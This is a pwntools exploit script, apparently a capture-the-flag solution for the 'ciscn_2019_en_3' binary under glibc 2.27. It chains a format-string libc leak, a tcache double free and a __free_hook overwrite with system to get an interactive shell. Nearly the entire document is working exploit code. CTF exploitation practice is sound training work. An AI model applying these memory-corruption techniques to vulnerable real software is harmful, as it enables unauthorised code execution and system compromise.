from pwn import *


ld_path = "/home/wsxk/Desktop/glibc/glibc-2.27/64/lib/ld-2.27.so"
libc_path = "/home/wsxk/Desktop/glibc/glibc-2.27/64/lib/libc-2.27.so"
p = process([ld_path, "./ciscn_2019_en_3"], env={"LD_PRELOAD":libc_path})


def add(size, con):
    p.recvuntil("Input your choice:")
    p.sendline("1")
    p.recvuntil("size of story: \n")
    p.sendline(str(size))
    p.recvuntil("inpute the story: \n")
    p.send(con)


def free(index):
    p.recvuntil("Input your choice:")
    p.sendline("4")
    p.recvuntil("input the index:\n")
    p.sendline(str(index))


# leak libc
pad = b"%p-%p-%p"
# pause()
p.send(pad)
p.recvuntil("-")
info = p.recvuntil("-", drop=True)
info = int(info.decode("ISO-8859-1"), 16)-17
print("read ", hex(info))

# count addr
libc = ELF(libc_path)
read = libc.sym["read"]
base = info-read
print("base ", hex(base))
# m_hook = base+libc.sym["__malloc_hook"]
# print("m_hook ", hex(m_hook))
f_hook = base+libc.sym["__free_hook"]
print("f_hook ", hex(f_hook))
onegad = [0x4f2c5, 0x4f322, 0x10a38c]
onegad = base+onegad[1]
print("onegad ", hex(onegad))
sys = base+libc.sym["system"]
print("system ", hex(sys))
# realloc = base+libc.sym["realloc"]
# print("realloc ", hex(realloc))

p.recvuntil("Please input your ID.\n")
p.send("a")

# alloc to libc
add(0x20, "a")  # 0
free(0)
free(0)
add(0x20, p64(f_hook))   # 1
add(0x20, "/bin/sh\x00") # 2
add(0x20, p64(sys))
pause()


# attack
free(1)  # 0 1 2都是指向同一个堆块，所以可以free其中的任意一个

p.interactive()
